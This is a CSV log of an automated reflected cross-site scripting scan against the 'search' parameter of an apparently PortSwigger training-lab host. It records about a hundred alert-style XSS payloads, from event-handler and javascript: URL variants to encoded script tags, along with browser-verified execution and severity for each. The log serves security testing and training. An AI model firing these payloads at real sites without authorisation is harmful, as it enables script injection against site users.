Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:21:40.970,2026-01-10 14:21:41.608,0.638,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:41.608,2026-01-10 14:21:41.955,0.347,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:41.955,2026-01-10 14:21:42.917,0.962,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 14:21:42.917,2026-01-10 14:21:44.035,1.118,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 14:21:44.035,2026-01-10 14:21:44.393,0.357,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:44.393,2026-01-10 14:21:44.808,0.415,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:44.808,2026-01-10 14:21:45.291,0.483,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:45.291,2026-01-10 14:21:45.461,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:45.461,2026-01-10 14:21:45.637,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:45.637,2026-01-10 14:21:45.807,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:45.807,2026-01-10 14:21:45.983,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:45.983,2026-01-10 14:21:46.154,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:46.154,2026-01-10 14:21:46.398,0.244,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:46.398,2026-01-10 14:21:46.719,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:46.719,2026-01-10 14:21:47.040,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:47.040,2026-01-10 14:21:47.207,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:47.207,2026-01-10 14:21:47.377,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:47.377,2026-01-10 14:21:47.549,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:47.549,2026-01-10 14:21:47.840,0.291,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:47.840,2026-01-10 14:21:48.008,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<details open ontoggle=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:48.008,2026-01-10 14:21:48.182,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:48.182,2026-01-10 14:21:48.350,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:48.350,2026-01-10 14:21:48.519,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:48.519,2026-01-10 14:21:48.801,0.283,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:48.801,2026-01-10 14:21:48.973,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:48.974,2026-01-10 14:21:49.147,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:49.147,2026-01-10 14:21:49.439,0.292,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:49.439,2026-01-10 14:21:49.623,0.184,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:49.623,2026-01-10 14:21:49.812,0.189,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:49.812,2026-01-10 14:21:50.080,0.267,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:50.080,2026-01-10 14:21:50.407,0.327,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:50.407,2026-01-10 14:21:50.719,0.313,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:50.719,2026-01-10 14:21:51.038,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:51.038,2026-01-10 14:21:51.359,0.322,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:51.359,2026-01-10 14:21:51.678,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:51.678,2026-01-10 14:21:52.000,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:52.000,2026-01-10 14:21:52.176,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:52.176,2026-01-10 14:21:52.479,0.303,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:52.479,2026-01-10 14:21:52.800,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:52.800,2026-01-10 14:21:53.120,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:53.120,2026-01-10 14:21:53.439,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:53.439,2026-01-10 14:21:53.700,0.261,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:53.700,2026-01-10 14:21:53.919,0.218,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:53.919,2026-01-10 14:21:54.239,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:54.239,2026-01-10 14:21:54.564,0.325,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:54.564,2026-01-10 14:21:54.730,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:54.730,2026-01-10 14:21:54.898,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:54.898,2026-01-10 14:21:55.205,0.307,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:55.205,2026-01-10 14:21:55.520,0.315,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:55.520,2026-01-10 14:21:55.688,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:55.688,2026-01-10 14:21:55.999,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:56.000,2026-01-10 14:21:56.170,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:56.170,2026-01-10 14:21:56.480,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:56.480,2026-01-10 14:21:56.801,0.322,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:56.801,2026-01-10 14:21:56.969,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:56.969,2026-01-10 14:21:57.280,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:57.280,2026-01-10 14:21:57.600,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:57.600,2026-01-10 14:21:57.920,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:57.920,2026-01-10 14:21:58.239,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:58.239,2026-01-10 14:21:58.559,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:58.559,2026-01-10 14:21:58.727,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:58.727,2026-01-10 14:21:58.944,0.216,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:58.944,2026-01-10 14:21:59.118,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:59.118,2026-01-10 14:21:59.287,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:59.287,2026-01-10 14:21:59.458,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:59.458,2026-01-10 14:21:59.627,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:59.627,2026-01-10 14:21:59.840,0.213,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:59.840,2026-01-10 14:22:00.009,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:00.009,2026-01-10 14:22:00.178,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:00.178,2026-01-10 14:22:00.478,0.301,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:00.478,2026-01-10 14:22:00.802,0.323,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:00.802,2026-01-10 14:22:01.119,0.318,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:01.120,2026-01-10 14:22:01.439,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:01.439,2026-01-10 14:22:01.759,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:01.759,2026-01-10 14:22:02.084,0.326,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:02.084,2026-01-10 14:22:02.253,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:02.253,2026-01-10 14:22:02.559,0.305,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:02.559,2026-01-10 14:22:02.732,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:02.732,2026-01-10 14:22:02.903,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:02.903,2026-01-10 14:22:03.077,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:03.077,2026-01-10 14:22:03.359,0.282,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:03.359,2026-01-10 14:22:03.527,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:03.527,2026-01-10 14:22:03.839,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:03.839,2026-01-10 14:22:04.007,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:04.007,2026-01-10 14:22:04.318,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:04.318,2026-01-10 14:22:04.563,0.245,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:04.563,2026-01-10 14:22:04.800,0.237,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:04.800,2026-01-10 14:22:04.975,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:04.975,2026-01-10 14:22:05.149,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:05.149,2026-01-10 14:22:05.439,0.290,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:05.439,2026-01-10 14:22:05.724,0.285,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:05.724,2026-01-10 14:22:05.924,0.200,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:05.924,2026-01-10 14:22:06.103,0.179,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:06.103,2026-01-10 14:22:06.273,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:06.273,2026-01-10 14:22:06.564,0.290,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:06.564,2026-01-10 14:22:06.880,0.317,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:06.880,2026-01-10 14:22:07.198,0.318,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:07.198,2026-01-10 14:22:07.518,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:07.518,2026-01-10 14:22:07.694,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:07.694,2026-01-10 14:22:07.861,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
